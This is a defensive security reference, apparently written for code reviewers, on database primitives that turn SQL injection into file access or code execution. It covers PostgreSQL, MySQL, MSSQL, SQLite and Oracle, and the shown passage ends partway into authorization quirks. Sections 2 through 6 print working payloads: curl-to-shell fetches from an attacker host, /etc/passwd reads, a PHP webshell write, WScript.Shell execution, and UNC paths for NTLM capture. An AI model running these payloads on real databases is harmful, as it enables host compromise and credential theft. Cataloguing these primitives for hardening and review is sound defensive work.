# SQL Dialect Behavioral Footguns — Per-Database Primitives That Are Unsafe by Default
## Synthesized from the canonical database-security researchers (Anley, Litchfield, Damele, Polyakov), the offensive tool maintainers (sqlmap, Metasploit, PowerUpSQL), the vendor security teams (PostgreSQL Security, MySQL/Oracle, Microsoft, SQLite), and the audit firms (Trail of Bits, NCC Group, PortSwigger, Tencent Blade, Check Point)

> **Currency marker:** Last refreshed 2026-05-14. Companion to
> `code_review_expertise.md` (the click-count severity discipline
> applies to every primitive catalogued here),
> `python_footguns_expertise.md` (SQLAlchemy and Django ORM call
> sites are the most common Python-side entry points),
> `ruby_footguns_expertise.md` (ActiveRecord injection surface),
> `java_footguns_expertise.md` (JDBC and Hibernate),
> `php_footguns_expertise.md` (mysqli/PDO),
> `csharp_dotnet_footguns_expertise.md` (SqlClient + Entity Framework),
> `distributed_authz_expertise.md` (Row Level Security implementations),
> `cicd_supply_chain_expertise.md` (managed-database secret handling).
> Load-bearing 2024-2026 updates: PostgreSQL `CVE-2024-7348` (pg_dump
> TOCTOU privesc), `CVE-2024-10977` (libpq MITM error retention),
> ongoing scrutiny of `pg_execute_server_program` / `pg_read_server_files`
> roles, MySQL 8.x `caching_sha2_password` driver fallout, and the
> long-tail SQLite `ATTACH` / `load_extension` primitive in embedded
> contexts (Slack desktop, Firefox cookies, mobile keystores).
>
> **Researchers:**
> - **Chris Anley** — author of the seminal 2002 NGSSoftware paper
>   "Advanced SQL Injection in SQL Server Applications" and its
>   follow-up "(more) Advanced SQL Injection." The canonical text on
>   `xp_cmdshell`, OPENROWSET, error-based extraction, and the
>   MSSQL-specific primitives still catalogued today. Co-author of
>   *The Database Hacker's Handbook* (Wiley, 2005) and *The
>   Shellcoder's Handbook*. Now CSO at NCC Group.
> - **David Litchfield** — co-author with Anley of *The Database
>   Hacker's Handbook*; sole author of *The Oracle Hacker's Handbook*
>   (Wiley, 2007) and *SQL Server Security*. Discoverer of the 2008
>   Oracle "Lateral SQL Injection" class and the 2006 cursor-snarfing
>   class. The single largest individual contributor to public Oracle
>   security research. Cross-link §6.
> - **Bernardo Damele A. G.** — took over sqlmap from Daniele Bellucci
>   in September 2006 and led its development through the modern
>   bisection-based detection engine, file-system access, and
>   takeover features. Black Hat Europe 2009 talk introduced sqlmap
>   to the wider community. Authored the 2009 "Advanced SQL injection
>   to operating system full control" paper.
> - **Miroslav Stampar** — joined sqlmap in 2009; current maintainer.
>   Co-author of the modern detection engine and the bulk of dialect-
>   specific takeover payloads (file read/write, UDF upload, RCE
>   primitives). The most reliable source for what *actually* works
>   in 2026 against modern MySQL/MSSQL/PostgreSQL/Oracle versions.
> - **HD Moore** — founder of Metasploit (2003); originator of the
>   `mssql_payload_sqli`, `mssql_ntlm_stealer`, and broader database-
>   exploitation module family. The MSSQL UNC-path NTLM-relay primitive
>   was operationalized in Metasploit before being widely understood
>   in the broader pentest community.
> - **Alexander Polyakov** — founder of ERPScan; author of books on
>   SAP and Oracle Database security. Coined the term "SSRF" in 2013
>   and demonstrated the Oracle / SAP database lateral-movement
>   surface through `DBMS_LDAP`, `UTL_HTTP`, `XML DB`. The institutional
>   memory for Oracle / SAP / PeopleSoft database attacks.
> - **PortSwigger Research / James Kettle** — Director of Research at
>   PortSwigger; author of HTTP Request Smuggler, Backslash Powered
>   Scanner, the "Practical Web Cache Poisoning" series. The Web
>   Security Academy SQL injection curriculum is the most accessible
>   modern reference for blind / time-based / second-order patterns.
> - **PostgreSQL Security Team** — institutional. Authors of the
>   per-CVE advisory pages (`postgresql.org/support/security/`) and
>   the documentation that defines the `pg_read_server_files` /
>   `pg_write_server_files` / `pg_execute_server_program` role
>   boundaries introduced in PG 11. The institutional source for the
>   dispute over whether `COPY FROM PROGRAM` is a vulnerability (their
>   position: it is a documented privileged primitive, not a CVE).
> - **Tencent Blade Team** — discoverers of "Magellan" (CVE-2018-20346,
>   -20505, -20506) — the SQLite FTS3 integer-overflow chain that
>   demonstrated `ATTACH DATABASE` + crafted SQL is a remote code
>   execution primitive in any context where attacker-controlled SQL
>   reaches a SQLite engine. Continued SQLite work through "Magellan 2."
> - **Trail of Bits database team** — `Testing Handbook` appsec.guide
>   chapters on database hardening; the cURL audit (which exercised
>   `sqlite3` extension loading); pgAudit / row-level-security write-ups
>   in the blog archive.
> - **Kurt Boberg** (Semgrep) — co-author of this expertise; reporter
>   of CVE-2018-3760 (Rails Sprockets path traversal — adjacent to
>   the data-export primitive set), CVE-2023-22794 (ActiveRecord
>   annotation SQLi — the ORM-introduced footgun pattern in §12).
>
> **Institutional contributors:** OWASP SQL Injection Prevention
> Cheat Sheet; OWASP Web Security Testing Guide v4.2 (the WSTG MSSQL
> chapter is the single best on-page reference for SQL Server testing);
> CWE-89, CWE-94, CWE-78 entries; CIS Benchmarks for PostgreSQL /
> MySQL / MSSQL / Oracle; the `PayloadsAllTheThings` repository's
> per-dialect SQL injection cheat sheets; NetSPI's `PowerUpSQL`
> attack cheat sheet (the authoritative SQL Server lateral-movement
> guide); HackTricks `network-services-pentesting/pentesting-*`
> chapters.

Cross-links: see `code_review_expertise.md` for the click-count
severity heuristic and the "auth-homogeneity audit pattern"; the
first move on any database review is to enumerate which roles can
execute which dialect-specific primitives, because the inventory in
§§2-6 of *this* document is the catalog the reviewer is testing
against. See the [Semgrep rule-writing docs](https://semgrep.dev/docs/writing-rules/overview) for the rule-authoring
guidance referenced in §13. See `distributed_authz_expertise.md`
for the broader RLS / multi-tenant story that §9 covers from the
SQL-dialect angle. See `cicd_supply_chain_expertise.md` for the
managed-database secret-handling and cooldown discipline that
applies to RDS / Cloud SQL / Azure SQL deployments referenced in §14.

---

## 1. The behavioral-footgun framing

This document is **not** an SQL-injection primer. The cross-language
bug class is covered implicitly in the language footgun docs
(`python_footguns_expertise.md` §10, `ruby_footguns_expertise.md` §9,
etc.). The generic story is: do not concatenate; bind parameters;
audit ORM escape hatches.

This document covers what happens *after* SQL injection succeeds —
or, equivalently, what happens when a database account's privileges
enable the primitives below on the assumption that "the application
is the only thing that talks to the database." An injection that
reaches `xp_cmdshell` is RCE; one that reaches `COPY FROM PROGRAM`
is RCE; one that reaches `load_extension` is RCE. The dialect-
internal primitive set determines whether a SQLi finding is HIGH
(data exfiltration) or CRITICAL (full-host compromise).

A *bug class* answers "what kind of vulnerability is this." A
*behavioral footgun* answers "what does this primitive do, such
that ordinary use produces a bug class without the developer
noticing." `xp_cmdshell` is the obvious case. But
`OPENROWSET('SQLOLEDB', ...)` is the same shape — it looks like
reading a remote table and its default behavior is to authenticate
to the remote server using the SQL service account's credentials.
PostgreSQL's `pg_read_server_files` role grant is the same shape —
a documented permission whose effect is unconstrained server-side
file read with the engine's UID.

Three properties of every major SQL engine amplify the catalog:

1. **The engine ships with hundreds of built-in primitives.** A
   small subset is privileged-by-design. Operators must enumerate
   the subset and disable / restrict each. No engine ships with
   the dangerous set disabled *and* documented for operators to
   find. PostgreSQL's `pg_execute_server_program` role is the
   canonical example: opaque name, RCE primitive.
2. **The privilege model is dialect-specific and historically
   accreted.** MSSQL has logins, server roles, database roles,
   schemas, ownership chaining, `EXEC AS`. PostgreSQL has roles,
   `INHERIT` / `NOINHERIT`, `BYPASSRLS`, `SECURITY DEFINER`. MySQL
   added roles only in 8.0 and the implementation diverges from
   the SQL standard. SQLite has no users (filesystem ACLs). Oracle
   has profiles, system privileges, object privileges, roles,
   contexts, VPD. The cross-dialect reviewer holds five mental
   models.
3. **The default network surface includes powerful side
   primitives.** `OPENROWSET` and linked servers in MSSQL talk to
   other servers; `dblink` and `postgres_fdw` in PostgreSQL do the
   same; Oracle's `DBMS_LDAP` makes outbound LDAP queries; MySQL's
   `LOAD DATA LOCAL INFILE` *inverts the trust direction* — a
   rogue server can ask any client for any file. Each is a footgun
   independent of injection.

Cross-link [[reference-code-review-expertise]] §"Auth-homogeneity
audit pattern": the dialect privilege inventory is heterogeneous
by design; the reviewer's first move is to enumerate every account
the application uses and every grant each holds. An application
that uses one account with table-level minimum privileges is
structurally immune to most of the catalog below; one that uses a
shared `sa` / superuser / `root` is structurally exposed to all
of it.

**Audit-cost asymmetry:** the developer creates the database user
once and forgets; the auditor reconstructs the privilege graph
from `pg_authid` / `mysql.user` / `sys.server_principals` /
`DBA_ROLE_PRIVS`. Every grant is a permanent claim on attacker
surface; every cloud-managed default (`rds_superuser`,
`cloudsqlsuperuser`, Azure SQL admin) is a starting point an
attacker can build on. The detection patterns in §13 and the
defensive checklist in §14 are the load-bearing artifacts.

---

## 2. PostgreSQL

PostgreSQL has the cleanest documentation and most ergonomic
privilege model — and the most powerful built-in primitives for
converting SQL access into OS access. The project's position
(per the 2019 EDB blog "PostgreSQL COPY FROM PROGRAM is not a
Vulnerability") is that the DBA is trusted and the documented
privileged roles are not CVEs. Operators who don't want them
must explicitly remove grants.

### 2.1 `COPY ... FROM PROGRAM 'shell-command'`

The primary PostgreSQL OS-command-execution primitive. Available to:

- Any superuser (`rolsuper = true` in `pg_authid`).
- Any role granted `pg_execute_server_program` (introduced in
  PG 11; superuser-only before that).

```sql
COPY some_table FROM PROGRAM 'curl http://attacker/x | sh';
COPY (SELECT '') TO PROGRAM 'id > /tmp/whoami';
```

The shell runs in the engine's OS context (typically `postgres` on
Linux). sqlmap's `--os-shell` against PostgreSQL implements this
chain end-to-end. Defensive posture: no application account is
ever a superuser; no application account is ever granted
`pg_execute_server_program`.

Cross-link [[reference-code-review-expertise]] §"Click-count
severity": SQLi → `pg_execute_server_program` → RCE is zero-click
once injection is reached.

### 2.2 `COPY ... FROM '/path/to/file'` (server-side file read/write)

Non-PROGRAM COPY reads/writes the local filesystem in the engine's
UID. Available to:

- Any superuser.
- `pg_read_server_files` (read) — PG 11+.
- `pg_write_server_files` (write) — PG 11+.

The roles were introduced as finer-grained alternatives to "be a
superuser." Unanticipated consequence: granting them for documented
bulk-CSV use cases also grants read of `/etc/passwd`,
`postgresql.conf`, `pg_hba.conf`, WAL files — anything the engine
UID can read. The grants are unscoped.

```sql
CREATE TABLE leak (data text);
COPY leak FROM '/etc/passwd';
SELECT * FROM leak;
```

### 2.3 `CREATE EXTENSION` — install arbitrary C extension

Loads a pre-installed extension (shared library on the server) and
runs its init SQL.

- **Trusted extensions** (`trusted = true` in control file) install
  by any database owner. Curated set includes `pgcrypto`, `citext`,
  `hstore`.
- **Untrusted** require superuser. Includes anything that loads C
  or untrusted procedural languages. `pgvector` was *not* trusted as
  of mid-2025.

Attack chain: write malicious `.so` via `pg_write_server_files` to
the extension directory, then `CREATE EXTENSION` it. End-to-end
SQL-to-RCE without `pg_execute_server_program`.

Managed databases (RDS, Cloud SQL, Azure) allowlist extensions and
disable `CREATE EXTENSION` outside the list.

### 2.4 `CREATE FUNCTION ... LANGUAGE C`

Same chain as 2.3 without the trusted/untrusted abstraction — names
a shared library and symbol directly. Superuser-only.

### 2.5 `lo_export` / `lo_import`

Pre-COPY-PROGRAM-era file read/write. Superuser-only. sqlmap still
attempts when other primitives unavailable.

### 2.6 Trusted vs untrusted procedural languages

Trusted PL/pgSQL, PL/v8, PL/Perl cannot access filesystem or spawn
processes. Untrusted PL/Python3U, PL/PerlU (the `U` suffix) can.

Any role with `CREATE` on a database can write functions in a
trusted language. Only superuser can create in untrusted languages
*by default* — but `GRANT USAGE ON LANGUAGE plpython3u TO analytics`
for a documented analytics use case is end-to-end RCE.

```sql
CREATE FUNCTION pwn() RETURNS void AS $$
import os
os.system("curl http://attacker/x | sh")
$$ LANGUAGE plpython3u;
SELECT pwn();
```

### 2.7 `SECURITY DEFINER` + `search_path` hijack

A `SECURITY DEFINER` function runs with the owner's privileges.
Attack:

1. Owner writes a `SECURITY DEFINER` function (often owned by
   `postgres` superuser) that references tables/functions without
   schema-qualification.
2. Caller controls `search_path`.
3. Caller creates `attacker_schema.users` and prepends to
   `search_path`.
4. The function resolves `users` to the attacker's version — a
   view with a trigger that runs arbitrary code as the owner.

`CVE-2007-2138`-class; recurrent through `CVE-2018-1058`. Fix:
`SET search_path = pg_catalog, public` in the function definition.

### 2.8 `dblink` and `postgres_fdw` — lateral-DB / SSRF

Outbound connection primitives from the engine UID. Two attack
classes:

1. **Internal SSRF** — reach internal admin DBs, replication ports,
   or `dblink_connect('host=169.254.169.254 ...')` for cloud-metadata.
2. **Credential exfiltration** — connect to attacker-controlled
   hosts using delegated credentials.

Leave the extension uninstalled unless required.

### 2.9 `pg_settings` information leakage

Public-readable by default. Discloses `data_directory`,
`ssl_cert_file`, `ssl_key_file`. The footgun is the chain:
`pg_settings` discovers cert paths; `pg_read_server_files` reads
them.

### 2.10 `pg_dump` TOCTOU — `CVE-2024-7348`

`pg_dump` typically runs as superuser. Between its `LOCK TABLE`
and its read, a low-privilege attacker can swap a table for a view
or foreign table whose definition calls an arbitrary SQL function
— which `pg_dump` then executes as superuser. Fixed in 16.4 /
15.8 / 14.13 / 13.16 / 12.20.

Class lesson: any superuser tool that iterates objects an attacker
can replace inherits the same TOCTOU shape. `pg_restore`,
`vacuumdb`, custom maintenance scripts apply.

### 2.11 `libpq` MITM — `CVE-2024-10977`

`libpq` historically retained pre-auth error messages from the
server, allowing a MITM to inject content into the operator's
psql/terminal. Fixed in 17.1 / 16.5 / 15.9 / 14.14 / 13.17 / 12.21.

### 2.12 `BYPASSRLS` and RLS bypass

RLS is bypassed by: any superuser; any role with `BYPASSRLS`; the
table owner (unless `FORCE ROW LEVEL SECURITY`). Owner-bypass is
the most-missed. See §9. Cross-link [[reference-distributed-authz]].

---

## 3. MySQL / MariaDB

MySQL and MariaDB share most of the catalog but diverge in defaults,
privileges, and auth plugins. MariaDB retains `mysql_native_password`
as default, keeping the historical attack surface alive longer.

### 3.1 `LOAD DATA INFILE '/path'` — server-side file read

Requires the `FILE` privilege. Unscoped: any FILE-privileged account
reads any file the server can read. `secure_file_priv` restricts
paths; set to NULL disables file I/O.

```sql
LOAD DATA INFILE '/etc/passwd' INTO TABLE leak;
```

MySQL 8.x defaults `secure_file_priv` to `/var/lib/mysql-files/` —
narrows but doesn't eliminate.

### 3.2 `LOAD DATA LOCAL INFILE` — the rogue-server attack

The `LOCAL` variant reads a file from the *client* and ships to the
server. A rogue server can exfiltrate any file from any connecting
client:

1. Client connects, handshakes (rogue accepts any creds).
2. Client sends a fingerprint query (`SELECT @@version_comment`).
3. Server responds with `0xFB` packet: "send me /etc/passwd."
4. Client reads `/etc/passwd` and uploads.

Exploitable any time an app accepts user-supplied MySQL host:
installer wizards, monitoring dashboards, BI tools. Disable in
client config: `--local-infile=0`, `mysqli.allow_local_infile=0`,
`allowLoadLocalInfile=false` (JDBC URL).

Windows variant: `LOAD DATA LOCAL INFILE '\\\\attacker\\share\\x'`
triggers SMB auth, sends NetNTLM hash (same shape as MSSQL §4).

### 3.3 `SELECT ... INTO OUTFILE '/path'` — file write

Write complement. Requires `FILE`, subject to `secure_file_priv`,
cannot overwrite. Canonical use: write a PHP webshell to a
web-accessible directory.

```sql
SELECT '<?php system($_GET[c]); ?>' INTO OUTFILE '/var/www/html/x.php';
```

### 3.4 User-Defined Functions (UDF)

`CREATE FUNCTION name RETURNS type SONAME 'file.so'` loads a C UDF
from `@@plugin_dir`. Attack chain: `FILE` writes `.so` via OUTFILE,
`CREATE` registers it. `lib_mysqludf_sys` provides
`sys_exec`/`sys_eval`. Harden: `secure_file_priv` outside plugin
dir; no `CREATE FUNCTION` to app accounts.

### 3.5 Reflection surface

`SHOW VARIABLES` discloses `secure_file_priv`, `datadir`, log paths,
SSL config. `INFORMATION_SCHEMA` discloses all visible
tables/columns/indexes. `mysql.user` is the password-hash table.
App accounts should have no `SELECT` on `mysql.*`.

### 3.6 `SLEEP()` and `BENCHMARK()` — blind/timing channels

Time-based blind injection primitives. `BENCHMARK(N, expr)`
amplifies. Not privileged on their own but load-bearing for
detection. `MAX_EXECUTION_TIME` reduces signal-to-noise.

### 3.7 MySQL 8.0 `caching_sha2_password` driver fallout

MySQL 8.0 changed default auth plugin to `caching_sha2_password`,
requiring SSL or the server's RSA public key. Older clients fall
back silently or fail oddly. The footgun: operator rolls back to
`mysql_native_password` to fix the breakage, never undoes the
rollback. MariaDB retains the older default.

### 3.8 MariaDB fork divergence

Differences from MySQL 8.x: default auth plugin (3.7), optimizer
hints, `INVISIBLE` columns syntax, `SEQUENCE` objects vs emulation,
stored-procedure SQL/PSM compat, Galera vs Group Replication
defaults. Audit reference: "MySQL" is `>= 5.7`; "MariaDB" is
`>= 10.3`. Each needs its own manual lookup.

---

## 4. Microsoft SQL Server (MSSQL)

MSSQL has the largest enterprise footprint where SQLi is most
consequential — internal Windows networks where the SQL service
account opens NTLM relay, lateral movement, and AD escalation.
The footguns are catalogued in Anley's 2002 paper and have moved
only at the margins. NetSPI's PowerUpSQL is the operational guide.

### 4.1 `xp_cmdshell`

`EXEC xp_cmdshell 'whoami';` runs as the SQL Server service
account. Disabled by default since 2005; sysadmin required to
enable:

```sql
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
```

Footgun: third-party installers enable it once, never disable.

`sp_xp_cmdshell_proxy_account` allows non-sysadmin invocation; the
proxy creds are stored reversibly-encrypted. Over-permissive proxy
account = AD compromise.

### 4.2 `sp_OACreate` / `sp_OAMethod` — OLE Automation

Even with `xp_cmdshell` disabled, COM objects instantiate in the
SQL Server process:

```sql
DECLARE @sh INT;
EXEC sp_OACreate 'WScript.Shell', @sh OUT;
EXEC sp_OAMethod @sh, 'Run', NULL, 'cmd.exe /c calc';
```

Disabled by default since 2005. Any registered COM is reachable:
`Scripting.FileSystemObject`, `WinHttp.WinHttpRequest`,
`Wscript.Network`. Cross-link [[reference-csharp-dotnet-footguns]]
§"P/Invoke and COM".

### 4.3 `OPENROWSET` / `OPENDATASOURCE`

Disabled by default since 2005 ("Ad Hoc Distributed Queries"). When
enabled:

- Internal SSRF: `OPENROWSET('SQLOLEDB', 'Server=internal-db;...')`.
- File read: `OPENROWSET(BULK '/path', SINGLE_CLOB)` (requires
  `ADMINISTER BULK OPERATIONS`).
- Credential exposure: integrated-auth connections send SQL service
  creds to the named server — NTLM relay target.

`xp_dirtree`/`xp_fileexist` are the lighter UNC-aware variants.

### 4.4 UNC-path NTLM relay

The single most-operationally-important MSSQL primitive in AD.
Any T-SQL that resolves a UNC path triggers SMB auth with the SQL
service account credentials. Attacker's listener captures NetNTLM,
cracks offline or relays live (LDAP, HTTP-via-WebDAV, another SQL
without `EXTENDED PROTECTION`).

UNC-triggering primitives:

- `BACKUP DATABASE x TO DISK = '\\attacker\share\file.bak'`
- `xp_dirtree '\\attacker\share\path'`
- `xp_fileexist '\\attacker\share\file'`
- `OPENROWSET(BULK '\\attacker\share\file', ...)`
- `RESTORE HEADERONLY FROM DISK = '\\attacker\share\file'`

`BACKUP DATABASE`'s UNC resolves *before* authorization — even
`PUBLIC` users trigger auth. Metasploit `mssql_ntlm_stealer`
operationalizes; PowerUpSQL enumerates the set.

SQL service account is typically a domain user, the virtual
`NT SERVICE\MSSQLSERVER`, or `LocalSystem` — each with distinct
relay impact.

### 4.5 `xp_regread` / `xp_regwrite`

Undocumented sysadmin-only registry access. Persistence (autorun),
credential extraction (Putty, RDP), config tampering.

### 4.6 CLR Integration

`CREATE ASSEMBLY ... FROM 0x...` loads a .NET assembly bytestream
into the SQL Server process. `PERMISSION_SET = UNSAFE` lifts the
sandbox. Requires database `TRUSTWORTHY ON` (sysadmin / qualified
db_owner). Chain: SQLi → `TRUSTWORTHY ON` → `CREATE ASSEMBLY` from
hex → `CREATE PROCEDURE` wrapping CLR method → `EXEC`. End-to-end
RCE bypassing disabled `xp_cmdshell` / OLE Automation.

### 4.7 `EXEC AS LOGIN` / `EXEC AS USER`

Impersonation if `IMPERSONATE` is granted. `IMPERSONATE ANY LOGIN`
to a low-priv account is the over-applied dangerous case. Same
shape underlies `EXECUTE AS OWNER` stored procedures —
SECURITY-DEFINER-equivalent search-path-hijack risk; see §2.7.

### 4.8 Linked servers with sa-level credentials

Persistent connection definitions. Pattern producing lateral
movement: Server A has linked server to Server B with mapped login
`sa` on B. Attacker on A runs
`EXEC ('xp_cmdshell ''...''') AT [B]`. PowerUpSQL's
`Get-SQLServerLinkCrawl` enumerates the graph. Defense: never `sa`
mapped logins; least-privilege remote-side; audit every linked
server.

### 4.9 `EXEC` of dynamic SQL

`EXEC (@sql)` is unsafe. `EXEC sp_executesql @sql, @params,
@arg1=...` is the parameterized form.

### 4.10 Defender / Audit telemetry

Extended Events and Defender for SQL cover
`xp_cmdshell`/`sp_OACreate`/`OPENROWSET` well; UNC-relay
primitives are noisier — require XEvent
`audit_database_principal_impersonation_group`. Operators who
don't enable it have no telemetry on the most-important primitive.

---

## 5. SQLite

SQLite is in-process, no server, no users — privilege model is the
filesystem ACL. But the dialect footguns are severe because SQLite
is everywhere: Firefox, Slack desktop, mobile apps, OS metadata.

### 5.1 `ATTACH DATABASE '/path' AS db`

Attaches a file as a SQLite database. `ATTACH DATABASE '/etc/passwd'
AS p` opens and reads — error messages often disclose first bytes.
`ATTACH DATABASE 'writeable.db' AS w` + `CREATE TABLE w.x AS SELECT ...`
writes a new SQLite file — the staging primitive for §5.2.

osquery's `GHSA-4g56-2482-x7q8` documents this as by-design SQLite
behavior, not a tool bug: arbitrary-SQL access = filesystem
read/create.

### 5.2 `load_extension('/path/to/lib.so')`

The SQLite equivalent of CLR / `CREATE FUNCTION LANGUAGE C`.
Disabled at engine level; applications enabling it via
`sqlite3_enable_load_extension(db, 1)` for one trusted purpose
(e.g., SpatiaLite) cannot then prevent SQLi from loading any other
`.so`. OpenRefine `GHSA-87cf-j763-vvh8` documents the chain.

```sql
SELECT load_extension('/tmp/evil.so');
```

Check Point Research's "SELECT code_execution FROM * USING SQLite"
(2019) catalogs broader gadgets using load_extension + chained
`ATTACH` + crafted-database parsing.

### 5.3 SQLite CLI `-init` argument

`sqlite3 -init filename` executes SQL in `filename` before user
commands. Operator shell that runs `sqlite3 -init "$USER_INPUT"`
is RCE-equivalent.

### 5.4 VFS shim escapes — Magellan (Tencent Blade, 2018)

`CVE-2018-20346`, `-20505`, `-20506` ("Magellan"): FTS3 integer
overflow + buffer overflow chain, exploited via crafted SQL,
yielding RCE in the engine. `CVE-2020-15358`: heap overflow in
SELECT-with-INDEXED-BY.

Class lesson: **arbitrary-SQL access to a SQLite engine is RCE
at the engine's privilege level**. Disabling `load_extension`
does not make this safe — the engine itself is the attack surface.
Embedded contexts (Cordova, mobile sync engines, in-browser
persistence) that expose SQL syntax to untrusted input must treat
SQL parser exposure as equivalent to a userspace memory-corruption
sink.

### 5.5 WAL mode and checkpoint footprints

`*.db-wal` and `*.db-shm` are predictable writable files.
Directory-write access lets an attacker swap the WAL to inject
committed data on next read. Backups that copy `*.db` without
`*.db-wal` are inconsistent.

### 5.6 `PRAGMA temp_store_directory`

Redirects temp file storage. Combined with large-temp-file
queries, writes attacker-content to attacker-paths.

### 5.7 Embedded SQLite — pen-test relevance

SQLite as trust boundary: Firefox `cookies.sqlite` / `places.sqlite`,
Chrome / Edge cookies, Slack `Application Support/Slack/databases/`,
iOS/Android app storage, Windows Search, macOS Mail, WhatsApp /
Signal message stores. Local attacker reads files directly; remote
attacker who reaches SQLite-the-API through the surrounding app
gains the catalog. Cross-link [[reference-macos-apple-security]]
§"TCC boundaries".

---

## 6. Oracle

Oracle has the most baroque privilege model and longest legacy of
dialect primitives. Litchfield's *Oracle Hacker's Handbook* (2007)
and Polyakov's ERPScan publications are canonical. sqlmap support
is weaker than MSSQL's.

### 6.1 `UTL_FILE`

Server-side file I/O package. Historical default: `EXECUTE ON
UTL_FILE TO PUBLIC` + `UTL_FILE_DIR` init parameter. Modern Oracle
(11g+) replaces `UTL_FILE_DIR` with `DIRECTORY` objects requiring
explicit `READ`/`WRITE` grants. Upgrade paths leave old systems
exposed.

```plsql
DECLARE
  f UTL_FILE.FILE_TYPE;
BEGIN
  f := UTL_FILE.FOPEN('/etc', 'passwd', 'R');
END;
```

Harden: `REVOKE EXECUTE ON UTL_FILE FROM PUBLIC`; remove
`UTL_FILE_DIR`; scope `DIRECTORY` grants.

### 6.2 `DBMS_LDAP`

Outbound LDAP from the engine UID. Internal SSRF (reach DCs,
ldap-as-data-source) + LDAP injection if user input reaches the
filter. Historically `EXECUTE TO PUBLIC`. Revoke from PUBLIC.

### 6.3 `DBMS_XMLGEN`, `XMLType` — XXE

Oracle XML packages default to entity expansion enabled.

```sql
SELECT XMLType('<!DOCTYPE x [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
              <x>&xxe;</x>').getStringVal() FROM dual;
```

### 6.4 `DBMS_JAVA`

Oracle Database includes an embedded JVM.
`DBMS_JAVA.GRANT_PERMISSION` authorizes Java permissions; over-broad
grants (`JAVA.SYSADMIN` to a low-priv role) → `Runtime.exec` access.
Cross-link [[reference-java-footguns]] §JNI.

```sql
EXEC DBMS_JAVA.GRANT_PERMISSION('USER1', 'SYS:java.io.FilePermission',
  '/etc/passwd', 'read');
```

### 6.5 `EXTPROC`

C library callable via the listener-spawned extproc mechanism. The
"extproc attack" class (pre-2010) reaches RCE from any
listener-reachable attacker. Modern Oracle (12c+) uses
`DBMS_CREDENTIAL` + `ENFORCE_CREDENTIAL=TRUE` in `extproc.ora` —
but defaults to FALSE.

### 6.6 `DBMS_SCHEDULER` external jobs

`DBMS_SCHEDULER.CREATE_JOB(job_type => 'EXECUTABLE', ...)`. Requires
`CREATE EXTERNAL JOB`. Equivalent to `xp_cmdshell` via the job
queue.

### 6.7 Forms / Reports legacy components

Pre-2010 Oracle Forms/Reports persist in long-tail enterprise
installations. Their RPC, XML, and Java client surfaces are
separate attack vectors; Litchfield is the reference.

### 6.8 TNS listener lineage

Pre-2009: unauthenticated remote management; CVE-2012-1675
"poison attack" registration. Fixed in 2012 via
`SECURE_REGISTER_LISTENER` + `LOCAL_REGISTRATION` defaults. Still
a high-value internal target.

### 6.9 Lateral SQL Injection (Litchfield 2008)

`DATE`/`NUMBER` parameters converted to string via session-level
`NLS_DATE_FORMAT` — which is SQL-injectable. The canonical "non-
string parameter is still an injection sink" finding; Oracle-
specific (rests on NLS implicit conversion).

---

## 7. Type coercion and comparison quirks

### 7.1 MySQL string-to-number coercion

```sql
SELECT '0' = 0;     -- 1
SELECT '0.0' = 0;   -- 1
SELECT '0.01' = 0;  -- 0
SELECT 'abc' = 0;   -- 1   <-- surprising
SELECT 'abc' = 1;   -- 0
SELECT '1abc' = 1;  -- 1
```

Strings not starting with a digit coerce to 0. Security relevance:
`WHERE deleted = 0` against a VARCHAR `deleted` column with values
"yes"/"no" matches every row. Defense: type columns appropriately;
enable `STRICT_TRANS_TABLES`.

### 7.2 PostgreSQL `IS NOT DISTINCT FROM` vs `=` with NULLs

`NULL = NULL` is NULL. `IS NOT DISTINCT FROM` treats NULLs as
equal. Footgun in dedup / "find duplicate of this row" queries.

### 7.3 MSSQL collation defaults

Default `SQL_Latin1_General_CP1_CI_AS` is case-insensitive.
`'admin' = 'ADMIN'` is true. Username comparisons can collide;
SQL audit may treat as distinct rows while the auth layer
collapses them. Use `COLLATE Latin1_General_BIN2` for security
comparisons or normalize at storage.

### 7.4 Unicode/charset defaults

- MySQL pre-8.0: Latin-1; 8.0+: `utf8mb4`.
- PostgreSQL: set at `initdb` (UTF-8 typical).
- MSSQL: UCS-2/UTF-16 historically; UTF-8 (2019+) via collation.
- SQLite: UTF-8; BLOB is byte-level.
- Oracle: `NLS_CHARACTERSET`.

Cross-system pipelines: silent truncation / `?` substitution
breaks string-equality auth checks.

### 7.5 Case-folding surprises

`UPPER('ß')` is `'SS'` or `'ß'` per collation. Turkish dotless-I
folds differently. Username uniqueness check + login resolution
using different collations = account collision.

### 7.6 SQLite type affinity

Columns have affinity, not strict types. `INTEGER` accepts text /
blob. `WHERE col = 0` follows MySQL-like coercion. Use
`CHECK (typeof(col) = 'integer')` or `STRICT` table mode (3.37+).

---

## 8. NULL semantics

### 8.1 `NULL = NULL` is NULL

SQL-92 standard across dialects. A WHERE clause that is NULL is
treated as false. `WHERE password = ?` with NULL on both sides
matches no rows. Attack scenarios:

- **MSSQL `SET ANSI_NULLS OFF`**: legacy mode where
  `NULL = NULL` is true. Deprecated but encountered.
- **Filter bypass via NULL parameter**: app treats
  `WHERE deleted = ?` with NULL as "find deleted" → returns no
  rows; attacker uses `WHERE deleted IS NULL` to bypass.

### 8.2 `IS NULL` discipline

Always `IS NULL` / `IS NOT NULL`. Never `= NULL`.

### 8.3 `COALESCE`, `IFNULL`, `ISNULL`, `NVL`

- `COALESCE(a, b, ...)` — SQL standard, universal.
- `IFNULL(a, b)` — MySQL, SQLite. Two-arg.
- `ISNULL(a, b)` — MSSQL two-arg; Oracle's `ISNULL(x)` is a
  predicate. Confusing collision.
- `NVL(a, b)` — Oracle.

Cross-dialect SQL: `COALESCE`.

### 8.4 NULL index behavior diverges

- Oracle: NULLs not in B-tree. `WHERE col IS NULL` → full scan.
- PostgreSQL / MySQL / MSSQL: NULLs in B-tree; indexable.

Security relevance: soft-delete (`deleted_at IS NULL`) admin
queries that perform cleanly on PG/MySQL degenerate to table scans
on Oracle — DoS amplification when ported.

### 8.5 Three-valued logic

`NULL AND false` → false (short-circuits); `NULL AND true` → NULL;
`NULL OR true` → true (short-circuits); `NULL OR false` → NULL.
Attacker-controlled NULL in user-composed predicates flips checks
from "denied" to "unknown" — audit authz rule engines.

---

## 9. Authentication and authorization quirks

### 9.1 `GRANT ALL` vs explicit grants

`ALL` is dialect-specific union:

- PostgreSQL: SELECT, INSERT, UPDATE, DELETE, TRUNCATE,
  REFERENCES, TRIGGER.
- MySQL: + CREATE / DROP / INDEX at table level.
